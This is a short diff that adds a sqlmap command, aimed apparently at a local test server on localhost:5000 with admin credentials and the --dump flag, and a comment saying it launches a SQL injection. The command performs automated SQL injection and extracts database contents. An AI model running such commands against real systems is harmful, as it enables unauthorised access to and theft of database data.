@@ -1,0 +1,3 @@
+python sqlmap.py -u "http://localhost:5000/" --data="username=admin&password=password123" --dump
+
+#The above command will start a SQL injection to the target site.
